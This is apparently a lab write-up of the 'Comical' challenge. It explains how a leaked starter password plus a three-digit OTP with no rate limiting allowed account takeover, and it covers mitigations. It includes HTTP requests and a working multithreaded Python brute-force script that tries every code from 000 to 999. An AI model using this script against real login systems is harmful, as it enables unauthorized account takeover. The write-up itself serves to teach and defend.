---
title: Weak OTP Verification Leads to Account Takeover | Comical
date: 2026-07-17 15:37:00 +0530
categories: [A07 - Authentication Failures, Weak OTP]
tags: [webverse-pro, authentication, otp, brute-force, account-takeover, owasp-2025]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/comical-otp-brute-force.webp
  alt: Comical weak OTP verification challenge
---

## Lab Link

[Comical](https://dashboard.webverselabs-pro.com/mystery-challenges/comical)

## Overview

Comical was a members-only comic storefront protected by a username and password followed by a three-digit verification code.

Public content on the application disclosed a reusable starter password for member accounts. After authenticating with that password, the application created a pending session and displayed a three-digit verification form.

The verification endpoint did not enforce meaningful rate limiting, attempt limits, progressive delays, or session invalidation. Because the complete keyspace contained only 1,000 possible values, the code could be discovered through a controlled search.

Successful verification granted access to the member account page, where the challenge flag was displayed.

## Objective

The objective was to authenticate as a member, bypass the second verification step, and retrieve the protected flag from the account area.

## Vulnerability Identification

The primary vulnerability was **weak OTP verification caused by insufficient brute-force protection**.

Several conditions made the verification mechanism exploitable:

- The verification code contained only three digits.
- The complete search space was limited to values from `000` to `999`.
- Incorrect attempts did not invalidate the pending login session.
- No effective account lockout was observed.
- No meaningful rate limiting prevented repeated submissions.
- A correct code produced a distinguishable redirect away from the verification page.

The leaked starter password made it possible to reach the vulnerable OTP workflow for known member accounts.

## Recon and Approach

Initial reconnaissance focused on the public application, member login flow, account routes, static assets, and any information disclosed through news or storefront content.

The public news section revealed a starter password:

```text
longbox2019
```

Visible member handles from the pull-board area were then tested against the login form.

A successful password submission created a session containing a pending user identifier and redirected to the verification page.

The page requested a three-digit code and displayed only the final digits of the member's phone number. Testing the visible suffix directly as the code failed, indicating that the suffix was only a hint and not the OTP itself.

Direct access to the account page also failed because the application redirected unverified sessions back to the verification route.

At this point, the remaining attack surface was the three-digit verifier.

## Exploitation

### Step 1: Authenticate With the Disclosed Password

A visible member handle was submitted with the leaked starter password.

A successful login resulted in a redirect to the OTP verification page and established a pending authenticated session.

Example request structure:

```http
POST /login HTTP/1.1
Host: [REDACTED]
Content-Type: application/x-www-form-urlencoded

username=<member-handle>&password=longbox2019
```

The server accepted the password and returned a session cookie tied to the pending user.

### Step 2: Confirm the Verification Behavior

An invalid code was submitted to understand the failure response:

```http
POST /verify HTTP/1.1
Host: [REDACTED]
Cookie: session=[REDACTED]
Content-Type: application/x-www-form-urlencoded

code=000
```

Incorrect codes kept the user on the verification page.

The session remained valid after failed attempts, which meant the same authenticated state could be reused for additional guesses.

### Step 3: Search the Three-Digit Keyspace

Because the code space contained only 1,000 possible values, every value from `000` through `999` could be tested.

A successful guess was identified by a redirect away from `/verify`.

A simplified Python example is shown below:

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "https://[REDACTED]"
USERNAME = "<member-handle>"
PASSWORD = "longbox2019"

session = requests.Session()

login_response = session.post(
    f"{BASE_URL}/login",
    data={
        "username": USERNAME,
        "password": PASSWORD,
    },
    allow_redirects=False,
    timeout=15,
)

if login_response.status_code not in (302, 303):
    raise RuntimeError("Password authentication failed")

cookies = session.cookies.get_dict()


def test_code(code: int):
    value = f"{code:03d}"

    response = requests.post(
        f"{BASE_URL}/verify",
        data={"code": value},
        cookies=cookies,
        allow_redirects=False,
        timeout=15,
    )

    location = response.headers.get("Location", "")

    if response.status_code in (302, 303) and "/verify" not in location:
        return value, location

    return None


with ThreadPoolExecutor(max_workers=15) as executor:
    futures = [executor.submit(test_code, code) for code in range(1000)]

    for future in as_completed(futures):
        result = future.result()

        if result:
            code, location = result
            print(f"Valid code: {code}")
            print(f"Redirect: {location}")
            break
```

The search found a valid code and completed the verification step.

> The valid OTP is intentionally omitted because it is challenge-instance-specific.

### Step 4: Access the Member Account

After successful verification, the authenticated session was allowed to access the protected account page:

```http
GET /account HTTP/1.1
Host: [REDACTED]
Cookie: session=[REDACTED]
```

The account page contained a protected secret box with the challenge flag.

## Proof and Flag

The protected account page was successfully reached after discovering the valid three-digit code.

```text
WEBVERSE{REDACTED}
```

## Root Cause

The root cause was an insecure second-factor verification design.

The application treated a three-digit value as a meaningful authentication factor without implementing the controls required to protect such a small keyspace.

The verifier should have enforced strict attempt limits, server-side throttling, short expiration, one-time use, and session invalidation after repeated failures.

The public disclosure of a reusable starter password further weakened the authentication flow by allowing attackers to reach the OTP stage for known users.

## Impact

An attacker who knows or discovers a valid member handle could:

- Authenticate using the publicly disclosed starter password.
- Submit all possible three-digit verification codes.
- Complete the second-factor step without access to the member's phone.
- Take over the member account.
- Access protected account information and secrets.

In a real application, this weakness could expose personal data, saved addresses, payment information, order history, private messages, or account-management functions.

## Mitigation

### Increase OTP Strength

Use cryptographically secure, unpredictable codes with at least six digits.

A six-digit code provides one million possibilities instead of only one thousand.

### Enforce Attempt Limits

Limit the number of failed verification attempts allowed for each:

- Account
- Session
- IP address
- Device fingerprint
- OTP challenge

Invalidate the OTP and pending login session after a small number of failures.

### Add Rate Limiting

Apply server-side throttling and progressive delays to repeated verification attempts.

Rate limiting should not depend only on the source IP because attackers may distribute requests across multiple addresses.

### Expire Codes Quickly

Verification codes should expire after a short period and should become invalid immediately after successful use.

### Bind the Challenge Securely

Bind each OTP to the exact user, login attempt, session, and intended action.

A code issued for one account or session must never work for another.

### Remove Shared Passwords

Do not expose reusable starter passwords through public announcements, documentation, or application content.

Each user should receive a unique temporary credential and be required to replace it during first login.

### Monitor Suspicious Activity

Generate alerts for:

- Large numbers of failed OTP attempts
- Sequential OTP submissions
- Concurrent verification requests
- Repeated login attempts against multiple usernames
- Successful verification following an abnormal number of failures

## Lessons Learned

- A second factor is only useful when the verifier is resistant to guessing.
- Three-digit codes are too small to rely on without extremely strict controls.
- OTP security depends on rate limiting, expiration, one-time use, and attempt invalidation.
- Publicly disclosed default credentials can turn a weak verification flow into full account takeover.
- Redirect behavior can provide a reliable success oracle during automated testing.
- Authentication controls must be evaluated as a complete chain rather than as isolated steps.
